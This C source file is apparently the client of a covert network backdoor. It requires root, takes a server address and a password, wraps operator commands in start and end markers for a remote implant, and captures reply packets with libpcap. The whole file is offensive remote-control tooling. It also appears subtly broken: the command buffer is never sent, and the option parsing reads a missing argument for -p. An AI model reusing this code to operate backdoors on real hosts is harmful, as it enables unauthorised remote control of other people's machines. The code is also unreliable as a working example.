#include "backdoor-client.h"


int main(int argc, char **argv)
{
	/* Check to see if user is root */
	if (geteuid() != USER_ROOT)
	{
		printf("\nYou need to be root to run this.\n\n");
    		exit(0);
	}

	client.dst_port = DEFAULT_PORT;

	if(parse_options(argc, argv) < 0)
		exit(1);

	startClient();

	return 0;
}
int startClient(){
	char buffer[BUF_LENGTH];
	int quit = FALSE;
	pcap_t * nic_handle = NULL;
	struct bpf_program fp;
	int password_entered = FALSE;
	
	//start libpcap to display results
	startPacketCapture(nic_handle, fp, client.dst_port);
	while(!quit)
	{
		// First time iteration
		if(!password_entered)
		{
			printf("Enter a password: ");
			client.password = get_line(buffer, BUF_LENGTH, stdin);
			password_entered = TRUE;
			memset(buffer, 0, sizeof(buffer));
		}
		//read input
		client.command = get_line(buffer, BUF_LENGTH, stdin);
		if(strcmp(client.command, "quit") == 0){
			quit = TRUE;
		}
		memset(buffer, 0, sizeof(buffer));
		sprintf(buffer, "%s %d %s%s%s", client.password, SERVER_MODE, CMD_START, client.command, CMD_END);
		//clear buffer
		memset(client.command, 0, BUF_LENGTH);
	}
	stopPacketCapture(nic_handle, fp);
	return 0;
}

int parse_options(int argc, char **argv)
{
	char c;

	while ((c = getopt (argc, argv, "a:p")) != -1)
	{
		switch(c)
		{
			case 'a':
				client.server_host = optarg;
				break;
			case 'p':
				client.dst_port = atoi(optarg);
				break;
			case '?':
			default:
				usage(argv[0], CLIENT_MODE);
				return -1;
		}
	}
	return 0;

}

void print_client_info()
{
	fprintf(stderr, "Server's IP host: %s\n", client.server_host);
	fprintf(stderr, "Server's destination port: %d\n", client.dst_port);
	fprintf(stderr, "Sending cmd: %s\n", client.command);
}